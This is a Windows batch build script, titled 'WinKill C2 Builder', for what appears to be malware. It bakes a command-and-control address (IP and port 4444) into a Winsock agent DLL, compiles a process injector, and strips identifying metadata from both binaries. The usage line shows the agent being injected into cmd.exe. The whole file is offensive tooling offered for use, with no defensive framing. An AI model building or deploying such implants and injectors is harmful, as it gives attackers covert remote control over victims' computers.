@echo off
echo ============================================
echo   WinKill C2 Builder
echo ============================================
set IP=192.168.102.167
set PORT=4444
if not "%1"=="" set IP=%1
if not "%2"=="" set PORT=%2
for /f "usebackq" %%i in (`powershell -c "$b=[Net.IPAddress]::Parse('%IP%').GetAddressBytes();'0x{0:X8}' -f ($b[0] -bor ($b[1] -shl 8) -bor ($b[2] -shl 16) -bor ($b[3] -shl 24))"`) do set IPHEX=%%i
echo C2: %IP%:%PORT% (hex: %IPHEX%)
echo.
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%PORT% -o agent.dll agent.c -lws2_32 || goto :err
echo [1/2] agent.dll OK
gcc -O2 -s -m64 -fno-ident -o injector.exe injector.c || goto :err
echo [2/2] injector.exe OK
echo.
echo Build complete!
echo   injector.exe agent.dll cmd.exe
goto :end
:err
echo BUILD FAILED - Install MinGW-w64: https://winlibs.com/
:end
